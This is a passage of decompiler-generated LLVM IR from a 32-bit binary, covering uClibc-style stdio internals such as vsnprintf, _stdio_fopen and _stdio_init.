  %v4_80517ea = inttoptr i32 %arg1 to i8*
  %v5_80517ea = call i32 @__GI_vsnprintf(i8* %v4_80517ea, i32 -1, i32 %arg2, i32 %v2_80517d7)
  ret i32 %v5_80517ea
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80517f4 = load i32, i32* @ebp, align 4
  %v0_80517f5 = load i32, i32* @edi, align 4
  %v0_80517f6 = load i32, i32* @esi, align 4
  %v0_80517f7 = load i32, i32* @ebx, align 4
  store i32 %v0_80517f7, i32* %stack_var_-16, align 4
  %v4_80517fb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80517fb, i32* @esi, align 4
  %v2_80517ff = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_805180a = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_805180a, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_8051824 = sub i32 -1, %v4_80517fb
  %v1_8051837 = call i32 @__stdio_init_mutex(i32 %v2_80517ff)
  %v1_8051847 = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_8051824, %v1_8051847
  %v5_8051849 = select i1 %tmp, i32 %v1_8051824, i32 %v1_8051847
  store i32 %v5_8051849, i32* @ebx, align 4
  %v0_805184c = load i32, i32* @esi, align 4
  %v3_8051876 = inttoptr i32 %arg3 to i8*
  %v4_8051876 = call i32 @_vfprintf_internal(i32 %v2_805180a, i8* %v3_8051876, i32 %arg4)
  %v1_805187e = icmp eq i32 %v5_8051849, 0
  store i32 %v4_8051876, i32* @edx, align 4
  br i1 %v1_805187e, label %dec_label_pc_805189a, label %dec_label_pc_8051893

dec_label_pc_8051893:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_805184c to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_805189d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805189a

dec_label_pc_805189a:                             ; preds = %entry, %dec_label_pc_8051893
  %v0_805189d = phi i32 [ %v4_8051876, %entry ], [ %v0_805189d.pre, %dec_label_pc_8051893 ]
  %v2_805189f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805189f, i32* @ebx, align 4
  store i32 %v0_80517f6, i32* @esi, align 4
  store i32 %v0_80517f5, i32* @edi, align 4
  store i32 %v0_80517f4, i32* @ebp, align 4
  ret i32 %v0_805189d

; uselistorder directives
  uselistorder i32 %v1_8051847, { 1, 0 }
  uselistorder i32 %v1_8051824, { 1, 0 }
  uselistorder i32 208, { 1, 0 }
  uselistorder label %dec_label_pc_805189a, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80518a4 = load i32, i32* @ebp, align 4
  %v0_80518a5 = load i32, i32* @edi, align 4
  %v0_80518a6 = load i32, i32* @esi, align 4
  %v0_80518a7 = load i32, i32* @ebx, align 4
  store i32 %v0_80518a7, i32* %stack_var_-16, align 4
  %v4_80518ab = ptrtoint i8* %arg2 to i32
  store i32 %v4_80518ab, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_80518bb = load i8, i8* %arg2, align 1
  %v3_80518bb = zext i8 %v2_80518bb to i32
  %v4_80518bb = load i32, i32* @eax, align 4
  %v5_80518bb = and i32 %v4_80518bb, -256
  %v6_80518bb = or i32 %v5_80518bb, %v3_80518bb
  store i32 %v6_80518bb, i32* %eax.global-to-local, align 4
  %v10_80518bd = icmp eq i8 %v2_80518bb, 114
  br i1 %v10_80518bd, label %dec_label_pc_80518ff, label %dec_label_pc_80518c1

dec_label_pc_80518c1:                             ; preds = %entry
  %v10_80518c1 = icmp eq i8 %v2_80518bb, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_80518c1, label %dec_label_pc_8051901, label %dec_label_pc_80518ca

dec_label_pc_80518ca:                             ; preds = %dec_label_pc_80518c1
  %v10_80518ca = icmp eq i8 %v2_80518bb, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_80518ca, label %dec_label_pc_8051901, label %dec_label_pc_80518d2

dec_label_pc_80518d2:                             ; preds = %dec_label_pc_805197a, %dec_label_pc_8051954, %dec_label_pc_80518ca
  %v0_80518d2 = load i32, i32* %stack_var_-16, align 4
  %v1_80518d2 = call i32 @__errno_location(i32 %v0_80518d2)
  store i32 %v1_80518d2, i32* %eax.global-to-local, align 4
  %v0_80518d7 = load i32, i32* @ebp, align 4
  %v1_80518d7 = icmp eq i32 %v0_80518d7, 0
  %v1_80518d9 = inttoptr i32 %v1_80518d2 to i32*
  store i32 22, i32* %v1_80518d9, align 4
  br i1 %v1_80518d7, label %dec_label_pc_8051adb, label %dec_label_pc_80518e5

dec_label_pc_80518e5:                             ; preds = %dec_label_pc_805199d, %dec_label_pc_80518d2
  %v0_80518e5 = load i32, i32* @ebp, align 4
  %v1_80518e5 = add i32 %v0_80518e5, 1
  %v2_80518e5 = inttoptr i32 %v1_80518e5 to i8*
  %v3_80518e5 = load i8, i8* %v2_80518e5, align 1
  %v4_80518e5 = and i8 %v3_80518e5, 32
  %v5_80518e5 = icmp eq i8 %v4_80518e5, 0
  br i1 %v5_80518e5, label %dec_label_pc_8051adb, label %dec_label_pc_80518ef

dec_label_pc_80518ef:                             ; preds = %dec_label_pc_80518e5
  store i32 %v0_80518e5, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_80518f5 = call i32 @free(i32 %v0_80518e5)
  br label %dec_label_pc_8051ad6

dec_label_pc_80518ff:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8051901

dec_label_pc_8051901:                             ; preds = %dec_label_pc_80518ca, %dec_label_pc_80518c1, %dec_label_pc_80518ff
  %v0_8051912 = phi i32 [ 1089, %dec_label_pc_80518ca ], [ 577, %dec_label_pc_80518c1 ], [ 0, %dec_label_pc_80518ff ]
  %v1_8051901 = add i32 %v4_80518ab, 1
  %v2_8051901 = inttoptr i32 %v1_8051901 to i8*
  %v3_8051901 = load i8, i8* %v2_8051901, align 1
  %v12_8051901 = icmp eq i8 %v3_8051901, 98
  %v1_8051901.v4_80518ab = select i1 %v12_8051901, i32 %v1_8051901, i32 %v4_80518ab
  store i32 %v1_8051901.v4_80518ab, i32* %eax.global-to-local, align 4
  %v1_805190c = add i32 %v1_8051901.v4_80518ab, 1
  %v2_805190c = inttoptr i32 %v1_805190c to i8*
  %v3_805190c = load i8, i8* %v2_805190c, align 1
  %v12_805190c = icmp eq i8 %v3_805190c, 43
  %v1_8051910 = icmp eq i1 %v12_805190c, false
  br i1 %v1_8051910, label %dec_label_pc_805191a, label %dec_label_pc_8051912

dec_label_pc_8051912:                             ; preds = %dec_label_pc_8051901
  %v1_8051914 = or i32 %v0_8051912, 1
  store i32 %v1_8051914, i32* %eax.global-to-local, align 4
  %v1_8051917 = add nuw nsw i32 %v1_8051914, 1
  store i32 %v1_8051917, i32* @ebx, align 4
  br label %dec_label_pc_805191a

dec_label_pc_805191a:                             ; preds = %dec_label_pc_8051901, %dec_label_pc_8051912
  %v0_805199d7 = phi i32 [ %v0_8051912, %dec_label_pc_8051901 ], [ %v1_8051917, %dec_label_pc_8051912 ]
  %v1_805191a = icmp eq i32 %arg3, 0
  %v1_805191c = icmp eq i1 %v1_805191a, false
  br i1 %v1_805191c, label %dec_label_pc_8051950, label %dec_label_pc_805191e

dec_label_pc_805191e:                             ; preds = %dec_label_pc_805191a
  store i32 80, i32* %stack_var_-76, align 4
  %v1_8051923 = call i32 @malloc(i32 80)
  store i32 %v1_8051923, i32* %eax.global-to-local, align 4
  %v2_805192b = icmp eq i32 %v1_8051923, 0
  store i32 %v1_8051923, i32* @ebp, align 4
  br i1 %v2_805192b, label %dec_label_pc_8051add, label %dec_label_pc_8051935

dec_label_pc_8051935:                             ; preds = %dec_label_pc_805191e
  %v2_8051923 = inttoptr i32 %v1_8051923 to i16*
  store i16 8192, i16* %v2_8051923, align 2
  %v2_805193d = add i32 %v1_8051923, 8
  %v3_805193d = inttoptr i32 %v2_805193d to i32*
  store i32 0, i32* %v3_805193d, align 4
  %v2_8051944 = add i32 %v1_8051923, 56
  store i32 %v2_8051944, i32* %eax.global-to-local, align 4
  store i32 %v2_8051944, i32* %stack_var_-76, align 4
  %v1_8051948 = call i32 @__stdio_init_mutex(i32 %v2_8051944)
  store i32 %v1_8051948, i32* %eax.global-to-local, align 4
  %v0_805199d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051950

dec_label_pc_8051950:                             ; preds = %dec_label_pc_805191a, %dec_label_pc_8051935
  %v2_80519a3 = phi i32 [ %v0_805199d7, %dec_label_pc_805191a ], [ %v0_805199d.pre, %dec_label_pc_8051935 ]
  %v2_8051950 = icmp slt i32 %arg4, 0
  br i1 %v2_8051950, label %dec_label_pc_805199d, label %dec_label_pc_8051954

dec_label_pc_8051954:                             ; preds = %dec_label_pc_8051950
  %v1_8051956 = and i32 %v2_80519a3, 32771
  %v1_805195c = add nuw nsw i32 %v1_8051956, 1
  store i32 %v1_805195c, i32* @edx, align 4
  %v0_805195d = load i32, i32* @esi, align 4
  %v1_805195d = add i32 %v0_805195d, 1
  %v2_8051960 = and i32 %v1_805195d, %v1_805195c
  store i32 %v2_8051960, i32* %eax.global-to-local, align 4
  %v12_8051962 = icmp eq i32 %v2_8051960, %v1_805195c
  %v1_8051964 = load i32, i32* @ebp, align 4
  %v2_8051964 = add i32 %v1_8051964, 4
  %v3_8051964 = inttoptr i32 %v2_8051964 to i32*
  store i32 %arg4, i32* %v3_8051964, align 4
  %v1_8051967 = icmp eq i1 %v12_8051962, false
  br i1 %v1_8051967, label %dec_label_pc_80518d2, label %dec_label_pc_805196d

dec_label_pc_805196d:                             ; preds = %dec_label_pc_8051954
  %v0_805196d = load i32, i32* @esi, align 4
  %v1_805196f = and i32 %v0_805196d, 1024
  %v1_8051971 = xor i32 %v1_805196f, 1024
  store i32 %v1_8051971, i32* %eax.global-to-local, align 4
  %v1_8051976 = load i32, i32* @ebx, align 4
  %v2_8051976 = and i32 %v1_8051976, %v1_8051971
  %v3_8051976 = icmp eq i32 %v2_8051976, 0
  br i1 %v3_8051976, label %dec_label_pc_805196d.dec_label_pc_8051993_crit_edge, label %dec_label_pc_805197a

dec_label_pc_805196d.dec_label_pc_8051993_crit_edge: ; preds = %dec_label_pc_805196d
  br label %dec_label_pc_8051993

dec_label_pc_805197a:                             ; preds = %dec_label_pc_805196d
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_8051983 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_8051983, i32* %eax.global-to-local, align 4
  %v1_805198b = icmp eq i32 %v3_8051983, 0
  %v1_805198d = icmp eq i1 %v1_805198b, false
  br i1 %v1_805198d, label %dec_label_pc_80518d2, label %dec_label_pc_805197a.dec_label_pc_8051993_crit_edge

dec_label_pc_805197a.dec_label_pc_8051993_crit_edge: ; preds = %dec_label_pc_805197a
  %v0_8051993.pre = load i32, i32* @esi, align 4
  %v0_8051999.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051993

dec_label_pc_8051993:                             ; preds = %dec_label_pc_805196d.dec_label_pc_8051993_crit_edge, %dec_label_pc_805197a.dec_label_pc_8051993_crit_edge
  %v0_8051999 = phi i32 [ %v1_8051976, %dec_label_pc_805196d.dec_label_pc_8051993_crit_edge ], [ %v0_8051999.pre, %dec_label_pc_805197a.dec_label_pc_8051993_crit_edge ]
  %v0_8051993 = phi i32 [ %v0_805196d, %dec_label_pc_805196d.dec_label_pc_8051993_crit_edge ], [ %v0_8051993.pre, %dec_label_pc_805197a.dec_label_pc_8051993_crit_edge ]
  %v1_8051993 = and i32 %v0_8051993, 32768
  %v2_8051999 = or i32 %v1_8051993, %v0_8051999
  store i32 %v2_8051999, i32* @ebx, align 4
  br label %dec_label_pc_80519c1

dec_label_pc_805199d:                             ; preds = %dec_label_pc_8051950
  %v11_805199f = or i32 %v2_80519a3, 32768
  store i32 %v11_805199f, i32* %eax.global-to-local, align 4
  %v1_80519a2 = add i32 %arg4, 1
  %v8_80519a2 = icmp eq i32 %v1_80519a2, 0
  store i32 %v1_80519a2, i32* @edi, align 4
  %v1_80519a3 = icmp eq i1 %v8_80519a2, false
  %v4_80519a3 = select i1 %v1_80519a3, i32 %v11_805199f, i32 %v2_80519a3
  store i32 %v4_80519a3, i32* @ebx, align 4
  %v0_80519ad = load i32, i32* @esi, align 4
  store i32 %v0_80519ad, i32* %stack_var_-76, align 4
  %v3_80519ae = inttoptr i32 %v0_80519ad to i8*
  %v4_80519ae = call i32 @__libc_open(i8* %v3_80519ae, i32 %v4_80519a3)
  store i32 %v4_80519ae, i32* %eax.global-to-local, align 4
  %v2_80519b6 = icmp slt i32 %v4_80519ae, 0
  %v1_80519b8 = load i32, i32* @ebp, align 4
  %v2_80519b8 = add i32 %v1_80519b8, 4
  %v3_80519b8 = inttoptr i32 %v2_80519b8 to i32*
  store i32 %v4_80519ae, i32* %v3_80519b8, align 4
  br i1 %v2_80519b6, label %dec_label_pc_80518e5, label %dec_label_pc_80519c1

dec_label_pc_80519c1:                             ; preds = %dec_label_pc_805199d, %dec_label_pc_8051993
  %v0_80519c1 = load i32, i32* @ebp, align 4
  %v1_80519c1 = inttoptr i32 %v0_80519c1 to i32*
  %v2_80519c1 = load i32, i32* %v1_80519c1, align 4
  %v2_80519c1.tr = trunc i32 %v2_80519c1 to i16
  %v1_80519c9 = and i16 %v2_80519c1.tr, 8192
  %v3_80519c9 = inttoptr i32 %v0_80519c1 to i16*
  store i16 %v1_80519c9, i16* %v3_80519c9, align 2
  %v0_80519cd = load i32, i32* @ebx, align 4
  store i32 %v0_80519cd, i32* %eax.global-to-local, align 4
  %v1_80519cf = and i32 %v0_80519cd, -31744
  %v0_80519d5 = load i32, i32* @ebp, align 4
  %v1_80519d5 = inttoptr i32 %v0_80519d5 to i32*
  %v2_80519d5 = load i32, i32* %v1_80519d5, align 4
  %v1_80519d8 = mul i32 %v0_80519cd, 16
  %v1_80519db = and i32 %v1_80519d8, 48
  %v1_80519dc = add nuw nsw i32 %v1_80519db, 16
  %v2_80519df = xor i32 %v1_80519dc, 48
  %v2_80519e2 = or i32 %v2_80519d5, %v1_80519cf
  %v2_80519e4 = or i32 %v2_80519e2, %v2_80519df
  store i32 %v2_80519e4, i32* %eax.global-to-local, align 4
  %v1_80519e6 = trunc i32 %v2_80519e4 to i16
  %v3_80519e6 = inttoptr i32 %v0_80519d5 to i16*
  store i16 %v1_80519e6, i16* %v3_80519e6, align 2
  %v0_80519ea = load i32, i32* %stack_var_-76, align 4
  %v1_80519ea = call i32 @__errno_location(i32 %v0_80519ea)
  store i32 %v1_80519ea, i32* %eax.global-to-local, align 4
  %v0_80519f2 = load i32, i32* @ebp, align 4
  %v1_80519f2 = inttoptr i32 %v0_80519f2 to i16*
  %v2_80519f2 = load i16, i16* %v1_80519f2, align 2
  %v3_80519f2 = zext i16 %v2_80519f2 to i32
  store i32 %v3_80519f2, i32* @ebx, align 4
  %v1_80519f6 = inttoptr i32 %v1_80519ea to i32*
  %v2_80519f6 = load i32, i32* %v1_80519f6, align 4
  store i32 %v2_80519f6, i32* @edi, align 4
  store i32 %v1_80519ea, i32* @esi, align 4
  %v1_80519fa = add i32 %v0_80519f2, 4
  %v2_80519fa = inttoptr i32 %v1_80519fa to i32*
  %v3_80519fa = load i32, i32* %v2_80519fa, align 4
  store i32 %v3_80519fa, i32* %stack_var_-76, align 4
  %v1_80519fd = call i32 @isatty(i32 %v3_80519fa)
  %v2_8051a05 = mul i32 %v1_80519fd, 256
  store i32 %v2_8051a05, i32* %eax.global-to-local, align 4
  %v0_8051a08 = load i32, i32* @ebx, align 4
  %v2_8051a08 = or i32 %v0_8051a08, %v2_8051a05
  store i32 %v2_8051a08, i32* @ebx, align 4
  %v1_8051a0a = trunc i32 %v2_8051a08 to i16
  %v2_8051a0a = load i32, i32* @ebp, align 4
  %v3_8051a0a = inttoptr i32 %v2_8051a0a to i16*
  store i16 %v1_8051a0a, i16* %v3_8051a0a, align 2
  %v0_8051a0e = load i32, i32* @edi, align 4
  %v1_8051a0e = load i32, i32* @esi, align 4
  %v2_8051a0e = inttoptr i32 %v1_8051a0e to i32*
  store i32 %v0_8051a0e, i32* %v2_8051a0e, align 4
  %v0_8051a10 = load i32, i32* @ebp, align 4
  %v1_8051a10 = add i32 %v0_8051a10, 8
  %v2_8051a10 = inttoptr i32 %v1_8051a10 to i32*
  %v3_8051a10 = load i32, i32* %v2_8051a10, align 4
  %v4_8051a10 = icmp eq i32 %v3_8051a10, 0
  %v1_8051a14 = icmp eq i1 %v4_8051a10, false
  br i1 %v1_8051a14, label %dec_label_pc_8051a48, label %dec_label_pc_8051a16

dec_label_pc_8051a16:                             ; preds = %dec_label_pc_80519c1
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_8051a1e = call i32 @malloc(i32 4096)
  store i32 %v1_8051a1e, i32* %eax.global-to-local, align 4
  %v1_8051a26 = icmp eq i32 %v1_8051a1e, 0
  %v1_8051a28 = load i32, i32* @ebp, align 4
  %v2_8051a28 = add i32 %v1_8051a28, 8
  %v3_8051a28 = inttoptr i32 %v2_8051a28 to i32*
  store i32 %v1_8051a1e, i32* %v3_8051a28, align 4
  br i1 %v1_8051a26, label %dec_label_pc_8051a41, label %dec_label_pc_8051a2d

dec_label_pc_8051a2d:                             ; preds = %dec_label_pc_8051a16
  %v1_8051a2d = add i32 %v1_8051a1e, 4096
  store i32 %v1_8051a2d, i32* %eax.global-to-local, align 4
  %v1_8051a32 = load i32, i32* @ebp, align 4
  %v2_8051a32 = add i32 %v1_8051a32, 12
  %v3_8051a32 = inttoptr i32 %v2_8051a32 to i32*
  store i32 %v1_8051a2d, i32* %v3_8051a32, align 4
  %v0_8051a35 = load i32, i32* @ebp, align 4
  %v1_8051a35 = inttoptr i32 %v0_8051a35 to i32*
  %v2_8051a35 = load i32, i32* %v1_8051a35, align 4
  %v1_8051a38 = udiv i32 %v2_8051a35, 256
  %v3_8051a38 = and i32 %v1_8051a38, 191
  %v8_8051a38 = or i32 %v3_8051a38, 64
  %v10_8051a38 = mul nuw nsw i32 %v8_8051a38, 256
  %v11_8051a38 = and i32 %v2_8051a35, -65281
  %v12_8051a38 = or i32 %v10_8051a38, %v11_8051a38
  store i32 %v12_8051a38, i32* %eax.global-to-local, align 4
  %v1_8051a3b = trunc i32 %v12_8051a38 to i16
  %v3_8051a3b = inttoptr i32 %v0_8051a35 to i16*
  store i16 %v1_8051a3b, i16* %v3_8051a3b, align 2
  br label %dec_label_pc_8051a48

dec_label_pc_8051a41:                             ; preds = %dec_label_pc_8051a16
  %v0_8051a41 = load i32, i32* @ebp, align 4
  %v1_8051a41 = add i32 %v0_8051a41, 12
  %v2_8051a41 = inttoptr i32 %v1_8051a41 to i32*
  store i32 0, i32* %v2_8051a41, align 4
  br label %dec_label_pc_8051a48

dec_label_pc_8051a48:                             ; preds = %dec_label_pc_80519c1, %dec_label_pc_8051a2d, %dec_label_pc_8051a41
  %v0_8051a48 = load i32, i32* @ebp, align 4
  %v1_8051a48 = add i32 %v0_8051a48, 8
  %v2_8051a48 = inttoptr i32 %v1_8051a48 to i32*
  %v3_8051a48 = load i32, i32* %v2_8051a48, align 4
  store i32 %v3_8051a48, i32* %eax.global-to-local, align 4
  %v1_8051a4b = add i32 %v0_8051a48, 2
  %v2_8051a4b = inttoptr i32 %v1_8051a4b to i8*
  store i8 0, i8* %v2_8051a4b, align 1
  %v0_8051a4f = load i32, i32* @ebp, align 4
  %v1_8051a4f = add i32 %v0_8051a4f, 44
  %v2_8051a4f = inttoptr i32 %v1_8051a4f to i32*
  store i32 0, i32* %v2_8051a4f, align 4
  %v0_8051a56 = load i32, i32* @ebp, align 4
  %v1_8051a56 = add i32 %v0_8051a56, 1
  %v2_8051a56 = inttoptr i32 %v1_8051a56 to i8*
  %v3_8051a56 = load i8, i8* %v2_8051a56, align 1
  %v4_8051a56 = and i8 %v3_8051a56, 32
  %v5_8051a56 = icmp eq i8 %v4_8051a56, 0
  %v0_8051a5a = load i32, i32* %eax.global-to-local, align 4
  %v2_8051a5a = add i32 %v0_8051a56, 24
  %v3_8051a5a = inttoptr i32 %v2_8051a5a to i32*
  store i32 %v0_8051a5a, i32* %v3_8051a5a, align 4
  %v0_8051a5d = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a5d = load i32, i32* @ebp, align 4
  %v2_8051a5d = add i32 %v1_8051a5d, 28
  %v3_8051a5d = inttoptr i32 %v2_8051a5d to i32*
  store i32 %v0_8051a5d, i32* %v3_8051a5d, align 4
  %v0_8051a60 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a60 = load i32, i32* @ebp, align 4
  %v2_8051a60 = add i32 %v1_8051a60, 16
  %v3_8051a60 = inttoptr i32 %v2_8051a60 to i32*
  store i32 %v0_8051a60, i32* %v3_8051a60, align 4
  %v0_8051a63 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051a63 = load i32, i32* @ebp, align 4
  %v2_8051a63 = add i32 %v1_8051a63, 20
  %v3_8051a63 = inttoptr i32 %v2_8051a63 to i32*
  store i32 %v0_8051a63, i32* %v3_8051a63, align 4
  %v0_8051a66 = load i32, i32* @global_var_805c2cc.475, align 4
  store i32 %v0_8051a66, i32* @eax, align 4
  %v1_8051a6b = load i32, i32* @ebp, align 4
  %v2_8051a6b = add i32 %v1_8051a6b, 52
  %v3_8051a6b = inttoptr i32 %v2_8051a6b to i32*
  store i32 %v0_8051a66, i32* %v3_8051a6b, align 4
  br i1 %v5_8051a56, label %dec_label_pc_8051add, label %dec_label_pc_8051a70

dec_label_pc_8051a70:                             ; preds = %dec_label_pc_8051a48
  %v2_8051a7b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051a7b, i32* %stack_var_-76, align 4
  %v2_8051a80 = call i32 @__pthread_return_void(i32 %v2_8051a7b, i32 134566343)
  store i32 %v2_8051a80, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805c2b4.472 to i32), i32* %stack_var_-76, align 4
  %v1_8051a8c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c2b4.472 to i32))
  store i32 %v1_8051a8c, i32* @eax, align 4
  %v2_8051a9e = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8051a9e, i32* %stack_var_-76, align 4
  %v2_8051aa3 = call i32 @__pthread_return_void(i32 %v2_8051a9e, i32 134566343)
  store i32 %v2_8051aa3, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805c29c.476 to i32), i32* %stack_var_-76, align 4
  %v1_8051aaf = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805c29c.476 to i32))
  %v0_8051ab4 = load i32, i32* bitcast (i32** @global_var_805c298.477 to i32*), align 8
  store i32 %v0_8051ab4, i32* @eax, align 4
  %v1_8051ab9 = load i32, i32* @ebp, align 4
  %v2_8051ab9 = add i32 %v1_8051ab9, 32
  %v3_8051ab9 = inttoptr i32 %v2_8051ab9 to i32*
  store i32 %v0_8051ab4, i32* %v3_8051ab9, align 4
  %v2_8051abc = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8051abc, i32* @ecx, align 4
  %v0_8051abd = load i32, i32* @ebp, align 4
  store i32 %v0_8051abd, i32* bitcast (i32** @global_var_805c298.477 to i32*), align 8
  store i32 %v2_8051a9e, i32* %stack_var_-76, align 4
  %v2_8051ac7 = call i32 @__pthread_return_void(i32 %v2_8051a9e, i32 1)
  store i32 %v2_8051a9e, i32* @eax, align 4
  store i32 1, i32* @edx, align 4
  store i32 %v2_8051a7b, i32* %stack_var_-76, align 4
  %v2_8051ad1 = call i32 @__pthread_return_void(i32 %v2_8051a7b, i32 1)
  br label %dec_label_pc_8051ad6

dec_label_pc_8051ad6:                             ; preds = %dec_label_pc_80518ef, %dec_label_pc_8051a70
  %storemerge = phi i32 [ %v2_8051ad1, %dec_label_pc_8051a70 ], [ %v1_80518f5, %dec_label_pc_80518ef ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051add

dec_label_pc_8051adb:                             ; preds = %dec_label_pc_80518e5, %dec_label_pc_80518d2
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8051add

dec_label_pc_8051add:                             ; preds = %dec_label_pc_8051a48, %dec_label_pc_805191e, %dec_label_pc_8051ad6, %dec_label_pc_8051adb
  %v0_8051ae0 = load i32, i32* @ebp, align 4
  store i32 %v0_8051ae0, i32* %eax.global-to-local, align 4
  %v2_8051ae2 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051ae2, i32* @ebx, align 4
  store i32 %v0_80518a6, i32* @esi, align 4
  store i32 %v0_80518a5, i32* @edi, align 4
  store i32 %v0_80518a4, i32* @ebp, align 4
  ret i32 %v0_8051ae0

; uselistorder directives
  uselistorder i32 %v2_8051a9e, { 0, 2, 1, 4, 3 }
  uselistorder i32 %v2_8051a7b, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8051a35, { 1, 0 }
  uselistorder i32 %v1_8051a1e, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8051a05, { 1, 0 }
  uselistorder i32 %v1_80519ea, { 1, 0, 2 }
  uselistorder i32 %v11_805199f, { 1, 0 }
  uselistorder i32 %v1_8051971, { 1, 0 }
  uselistorder i32 %v0_805196d, { 1, 0 }
  uselistorder i32 %v2_80519a3, { 1, 0, 2 }
  uselistorder i32 %v1_8051923, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 1, 27, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0, 25, 26 }
  uselistorder i32 191, { 0, 2, 1 }
  uselistorder i32 577, { 0, 2, 1 }
  uselistorder i32 %arg4, { 3, 1, 0, 2, 4, 5 }
  uselistorder label %dec_label_pc_8051add, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8051ad6, { 1, 0 }
  uselistorder label %dec_label_pc_8051a48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051993, { 1, 0 }
  uselistorder label %dec_label_pc_8051950, { 1, 0 }
  uselistorder label %dec_label_pc_805191a, { 1, 0 }
  uselistorder label %dec_label_pc_8051901, { 2, 0, 1 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051ae9 = load i32, i32* @edi, align 4
  %v0_8051aea = load i32, i32* @esi, align 4
  %v0_8051aeb = load i32, i32* @ebx, align 4
  store i32 %v0_8051aeb, i32* %stack_var_-16, align 4
  store i32 1, i32* @ebx, align 4
  %v1_8051af4 = call i32 @__errno_location(i32 %v0_8051aeb)
  %v0_8051afc = load i16, i16* @global_var_805c2e0.468, align 32
  %v1_8051afc = zext i16 %v0_8051afc to i32
  store i32 %v1_8051afc, i32* @esi, align 4
  %v1_8051b03 = inttoptr i32 %v1_8051af4 to i32*
  %v2_8051b03 = load i32, i32* %v1_8051b03, align 4
  store i32 %v2_8051b03, i32* %ebp.global-to-local, align 4
  store i32 %v1_8051af4, i32* @edi, align 4
  %v1_8051b09 = call i32 @isatty(i32 0)
  %v0_8051b0e = load i32, i32* @ebx, align 4
  %v2_8051b17 = sub i32 %v0_8051b0e, %v1_8051b09
  %v2_8051b1b = mul i32 %v2_8051b17, 256
  %v0_8051b1e = load i32, i32* @esi, align 4
  %v2_8051b1e = xor i32 %v0_8051b1e, %v2_8051b1b
  %v1_8051b20 = trunc i32 %v2_8051b1e to i16
  store i16 %v1_8051b20, i16* @global_var_805c2e0.468, align 32
  %v0_8051b27 = load i16, i16* @global_var_805c330.469, align 16
  %v1_8051b27 = zext i16 %v0_8051b27 to i32
  store i32 %v1_8051b27, i32* @esi, align 4
  %v1_8051b2e = call i32 @isatty(i32 1)
  %v0_8051b33 = load i32, i32* @ebx, align 4
  %v2_8051b33 = sub i32 %v0_8051b33, %v1_8051b2e
  %v2_8051b35 = mul i32 %v2_8051b33, 256
  %v0_8051b38 = load i32, i32* @esi, align 4
  %v2_8051b38 = xor i32 %v2_8051b35, %v0_8051b38
  %v1_8051b3a = trunc i32 %v2_8051b38 to i16
  store i16 %v1_8051b3a, i16* @global_var_805c330.469, align 16
  %v0_8051b41 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8051b41 = load i32, i32* @edi, align 4
  %v2_8051b41 = inttoptr i32 %v1_8051b41 to i32*
  store i32 %v0_8051b41, i32* %v2_8051b41, align 4
  %v2_8051b46 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051b46, i32* @ebx, align 4
  store i32 %v0_8051aea, i32* @esi, align 4
  store i32 %v0_8051ae9, i32* @edi, align 4
  ret i32 %v1_8051b2e

; uselistorder directives
  uselistorder i32 %v1_8051af4, { 1, 0 }
  uselistorder i16* @global_var_805c330.469, { 1, 0 }
